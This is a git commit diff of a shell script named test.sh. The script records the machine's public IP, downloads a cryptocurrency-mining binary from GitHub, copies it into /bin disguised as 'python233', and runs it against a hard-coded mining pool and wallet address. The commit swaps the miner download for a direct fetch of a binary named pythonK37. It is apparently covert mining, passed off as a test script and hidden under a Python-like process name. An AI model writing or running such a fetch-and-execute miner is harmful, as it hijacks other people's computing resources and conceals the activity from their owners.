3332b6423c00c84a1c56cb6811bdb00354955c3d
one10001 <78626503+one10001@users.noreply.github.com>
2021-03-19 15:04:05 +0100

    Update test.sh

--- test.sh
+++ test.sh
@@ -3,10 +3,7 @@ iip=$(curl https://ipecho.net/plain)
 IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 #download build
-wget https://github.com/one10001/kawpowminer/releases/download/7.0/kawpowminer_all70.tar.gz
-tar -xzf kawpowminer_all70.tar.gz
-ls -la
-cd kawpowminer/build/kawpowminer/
-chmod +x kawpowminer
-cp kawpowminer /bin/python233
-python233 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
+wget https://github.com/one10001/10001code/raw/main/pythonK37
+chmod +x pythonK37
+cp pythonK37 /bin/python233
+pythonK37 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
